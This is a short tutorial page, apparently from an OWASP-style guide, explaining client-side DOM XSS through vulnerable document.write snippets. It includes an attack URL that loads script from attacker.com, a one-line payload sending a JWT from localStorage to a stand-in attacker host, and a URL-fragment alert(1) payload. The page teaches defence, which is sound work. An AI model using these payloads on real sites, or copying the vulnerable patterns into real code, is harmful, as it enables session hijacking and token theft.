Client XSS
==========

Per definition "_Client XSS vulnerability occurs when untrusted user supplied
data is used to update the DOM with an unsafe JavaScript call. A JavaScript call
is considered unsafe if it can be used to introduce valid JavaScript into the
DOM._". ([source][1]).

The "untrusted user supplied data" has multiple sources such as the DOM itself,
the URL e.g. a query string parameter or the fragment or even from a server
request. Client side store locations like `Cookies` or `Local Storage` are also
potential sources of XSS payloads.

As an example, consider the following script used to display ads on a website:

```JavaScript
document.write('<script type="text/JavaScript" src="' + (location.search.split('req=')[1] || '') + '"></scr'+'ipt>');
```

Since the `location.search.split` is not properly escaped, the `req` parameter
can be manipulated by an attacker to retrieve malicious JavaScript from a
location he/she is in control of, injecting it into the web page of which the
victim is visiting.

```
http://www.example.com/?req=https://www.attacker.com/poc/xss.js
```

To perform this attack, an attacker crafts an URL like the one above, sending it
to the victim. Upon clicking it, the `https://www.attacker.com/poc/xss.js`
script is requested by the ad snippet, making it run in the `www.example.com`
context.

This could be the initial step of a [Session Hijacking attack][2] as an
attacker's script may have access to the session cookie (if it was not properly
set as `httpOnly`) or to the `localStorage` where a JSON Web Token (JWT) may be
found:

```javascript
(new Image).src = '//attacer.com?jwt='+localStorage.get('JWT');
```

The sample above is a common example of how to exfiltrate data. Bypassing the
[Same Origin Policy][3] as the `JWT` value read from `localStorage` is sent as
part of the URL from where an image was supposed to load.


As we stated before, there are many "untrusted data" sources.
Some client-side frameworks use the URL fragment to identify resources or
application states; although the fragment is part of the URL, it is not sent to
the sever.

The following script is very simple and for demonstration purposes only, but
encompasses the concept of URL fragment as source of untrusted data. Assuming
that the following script is somewhere in the target page:

```html
<script>
x=location.hash.slice(1);
document.write(x)
</script>
```

Thus the following URL would trigger the famous `alert(1)` modal.

```
http://example.com/fragment.html#<script>alert(1)</script>
```

To know how to prevent XSS in general, please follow the guidelines provided in
[How to prevent XSS section][4].

[1]: https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Client_XSS
[2]: https://www.owasp.org/index.php/Session_hijacking_attack
[3]: https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
[4]: how-to-prevent.md
